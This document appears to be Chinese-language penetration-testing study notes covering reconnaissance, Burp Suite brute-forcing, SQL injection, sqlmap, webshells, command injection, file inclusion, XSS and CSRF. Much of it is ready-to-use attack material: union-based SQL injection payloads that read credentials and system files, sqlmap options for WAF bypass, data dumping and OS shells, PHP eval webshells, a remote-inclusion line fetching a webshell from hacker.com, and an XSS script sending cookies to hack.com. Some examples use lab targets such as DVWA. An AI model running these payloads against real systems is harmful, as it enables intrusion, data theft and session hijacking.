

#### 信息搜集

##### google

```sh
-xxx				#去掉相关
	电影 -中国		#示例：不会搜索中国相关的电影
*xxx				#模糊搜索	
	一个*决定去死		#示例，模糊搜索
"" 					#强制出现
	电影 "中国"		#示例：强制搜索中国相关的电影
	
site:xxx.com		#搜和某个网站相关的
	"安全" site:zhihu.com		#示例：搜索知乎网站和”安全"相关数据 (可尝试sql注入)
filetype:			#搜文件类型
	哲学 filetype:pdf		#示例：搜哲学相关的pdf文档
	
inurl:.php?id=		#搜索指定网页		(可尝试sql注入)
	inurl:login		#示例：搜索登录页
	
intitle:xxxx		#根据网站标题搜索
	intitle:后台管理 filetype:php	#示例：搜索网站标题为后台管理的php网页
	
intext:xxx			#搜索正文

...
```

##### shodan

可扫描一切联网设备

```sh
#可安装google和firefox插件使用

ip or dnsname			#根据ip或域名搜索服务器相关信息

telnet 
	telnet default password		#示例：根据telnet默认密码搜索
	
http				#搜http服务
 http country:"DE"	#示例：搜索某个国家
 http country:"DE" product:"Apache"		#搜锁某个国家的某个服务
 
ftp					#搜索ftp服务

Webcam				#搜索摄像头
	netcam			#关键词
	Server:xxx		#根据服务名搜索
	hikvision
	DNVRS-Webs
	linux upnp avtech
	
高级玩法：作为python库API编程交互

#过滤词：
	country
	product
	version
	hostname
	os
	net
		net:110.180.13.0/24		#示例：扫描网段
	port
	...
	
```

##### Zoomeye 

钟馗之眼，国产版

```sh
#www.zoomeeye.org
#语法类似google
```

##### 域名遍历

```sh
# DirBuster (kali工具)
	字典位置：/usr/share/dict/

#御剑后台扫描 (工具)

```

##### 指纹识别

```sh
#搜寻网站的架构，系统等
	工具：whatweb,httpprint,御剑指纹识别
```

#### 漏洞扫描

```sh
#商业扫描工具：
	burp suite		#(java编写)
	awvs			#(windows系统)
	appscan			#(windows系统)
# 开源扫描工具
	zap
	w3af

```

##### burp suite

```sh
1.kali linux 打开
	体验版升级(破解jar工具)
2.proxy:设置代理
3.target:设置目标站点扫描
	过滤冗余扫描:
		target->sitemap->选择站点,右键add to scope
		filter:选中show only-in scope items
4.spider:设置蜘蛛自动爬取网页
	spider:点击按钮(spider is running)
5.scanner:设置主动扫描
	live scanning (默认不做主动扫描)
	target->sitemap->actively scan this branch
6.intruder:入侵(爆破)
	访问登录页->查看代理条目(proxy)->右键send to intruder
	position:添加变量(双击变量点击add$，变量会使用字典代替)
		#攻击类型
		snipper:一个字典(用户名或密码)
		battering ram:1个字典(用户名和密码同时)
		pitch fork:多个字典(用户名和密码分别使用)
		cluster bomb:多个字典(用户名和密码交叉使用)
	payloads:加载字典
7.repeater:重放(手动模拟http操作)
	查看代理条目(proxy)->右键send to repeater
	
8.extender：扩展
	co2：sql注入工具集
	
```

#### sql注入

使用OWASP 的Damn Vulnerable Web Application做测试

```sql
#查表名语句
select table_name from information_schema.tables;
#查询用户权限
select grantee from information_schema.user_privileges;


#or
'or 1=1 --'			#示例
1' or 1=1 #			#示例
#union
'union select 1,2,3 --'				#字段猜解，示例

#查数据库名
1' union select 1,database() #		#示例	


#查表（注意后面有个#号）
1' union select 1,table_name from information_schema.tables where table_schema=database() #

#查列，users为上面语句查到的表名
1' union select 1,column_name from information_schema.columns where table_name='users' #
#如单引号无法使用，则尝试将users进行16进制acsii转换，注意前面加0x
1' union select 1,column_name from information_schema.columns where table_name=0x7573657273 #

#查列数据
1' union select user,password from users #

#查文件内容（如做了权限处理，应该查不出），文件权限包括文件自身的权限和mysql配置的权限
1'union select load_file('/etc/password'),database() from information_schema.tables #
1'union select load_file(0x2f6574632f70617373776f7264),database() from information_schema.tables #

#基于时间的盲注
1' and sleep(3) --'		#示例

```

##### sqlmap

使用OWASP Mutillidae II做测试

```sh
#sql注入工具，kali自带

#如果提示： your sqlmap version is outdated
sqlmap -update	#更新版本

sqlmap -v 		#版本
sqlmap -h 		#查看命令
sqlmap -hh		#查看详细命令

#示例：
sqlmap -u "http://192.168.137.136/mutillidae/index.php?page=user-info.php&username=admin&password=1&user-info-php-submit-button=View+Account+Details" -p username

#get方法注入:
sqlmap -u "url"		#指定注入网址
sqlmap -u "url" -f -p username
	-f 	#探测系统和数据库信息
	-p 	#指定探测的具体参数
	
sqlmap -u "url" -f -p username --users	#查看数据库用户信息
sqlmap -u "url" -f -p username --banner	#查看banner信息
sqlmap -u "url" -f -p username --dbs	#查看数据库
sqlmap -u "url" -f -p username --all	#all

#post方法注入：
#需要认证cookie的页面，先拦截post请求内容，post请求内容写入post.txt
sqlmap -r post.txt
sqlmap -r post.txt --users
sqlmap -r post.txt --dbs
sqlmap -r post.txt --all

#带参数注入：
sqlmap -u "url" --data="username=admin&password=123456" 	#get
sqlmap -u "url" --coolie=""		#post

#一些参数
--current-user	#查看当前管理员账号
--privileges -U user	#查看当前账号权限
--current-db	#查看当前使用的数据库
--tables -D "database" #查看当前数据库的数据表
--columns -T "fields" -D "database"	#查看字段
--count -T "fields" -D "database"	#查看字段数量
--schema --batch --exclude-sysdbs	#查看元数据（包括系统数据库）
--dump-all 		#保存所有数据到本地
--dump-all --exclude-sysdbs		#除了系统默认表，保存所有数据
--dump -C "username,password" -T "fields" -D "database"		#保存字段内容

sqlmap -u "url" --identify-waf		#识别WAF/IDS/IPS类型
sqlmap -u "url" --dbms=mysql --skip-waf --random-agent
	--skip-waf		#绕开waf防火墙
	--random-agent	#使用随机http头部
	--mobile		#模拟手机请求
	--level=3 --risk=2	#提高安全/危险等级
		--level 	#1到5级，默认1
		--risk		#1到4级，默认1
	--smart			#智能模式
	--offline		#减少和对方的交互
	--proxy="proxy-ip"		#代理注入
	--tor="tor-ip"		#指定暗网ip代理
sqlmap -u "url" --proxy="proxy-ip" --proxy-cred="user:pass"


#提权
--file-read="/etc/passwd"	#读取文件
--file-write="shell.php"	#写入文件
--sql-shell			#获取数据库shell（q或x退出）
--os-cmd="cat /etc/passwd"		#执行shell命令
--os-shell		#获取系统shell

	
```

##### havij

图形注入工具，略

#### 文件上传漏洞

```sh
1.前端校验绕过（修改前端代码）
2.文件类型限制，使用代理绕过（拦截http包，修改文件类型，大小）
3.文件名限制，使用代码植入(可用16进制编码更好绕过过滤)
	#cmd命令植入示例：
	copy 1.jpg/b+shell.php/a shell.jpg		#图片木马条件 => 文件包含漏洞 或 文件解析漏洞
```

##### 一句话木马

```
< ? php @eval($_REQUEST['pwd']);? >
```

```
< ? php
    #遍历目录
    #前端传入参数：cmd=opendir("./");
    $cmd = $_REQUEST["cmd"];
    $x = @eval($cmd);		#一句话木马
    while(($f=readdir($x)) != false){
        echo $f."\n";
    }
```

```
< ? php
    #执行系统命令
    #前端传入参数：cmd=echo shell_exec("dir");
    $cmd = $_REQUEST["cmd"];
	$x = @eval($cmd);
```

##### 一句话木马工具

```sh
windows下：中国菜刀
linux下：weevely	#kali集成
	weevely generate 123456 hack.php	#生成木马(目录：/usr/share/weevely)
```

#### 远程代码执行

```sh
#示例
ping 114.114.114.114		#正常命令
ping 114.114.114.114 && uname -a	#注入
```

##### 工具

```sh
jexboss		#攻击java web应用漏洞
```

#### 文件包含

```
#文件包含函数，的参数未经过校验，包含的文件里有恶意代码
#示例php，文件包含函数：
	#include()
	#include_once()
	#require()
	#require_once()
	#fopen()
	#fputs()
	#fwrite()
	
#远程包含：
	#shell语句(任一写入txt或jpg文件)
	#< ? fputs(fopen("shell.php","w")'< ? php eval($_POST[pass]);? >')?>		#
	#< ? fwrite(fopen("shell.php","w")'< ? php eval($_POST[pass]);? >')? >		#
	#访问：
	http://webserver.com/xx/xxx?page=http://hacker.com/xx/hack.jpg
```

#### xss

```js
//xss脚本示例
<script>window.open("http://www.hack.com/cookie.php?cookie="+document.cookie)</script>		#跨域
```

```sh
#自动xss工具
beff			#开源浏览器渗透框架
XSSer			#kali自带框架，（检测，渗透，报告）
```

#### csrf

```sh
#客户A，访问服务器C（cookie缓存）
#A访问恶意网站B，B自动访问C（携带客户A的cookie通过认证），冒充A实施攻击行为
A -> C
A -> B（恶意） -> C

#防御
每个请求都通过令牌校验
```



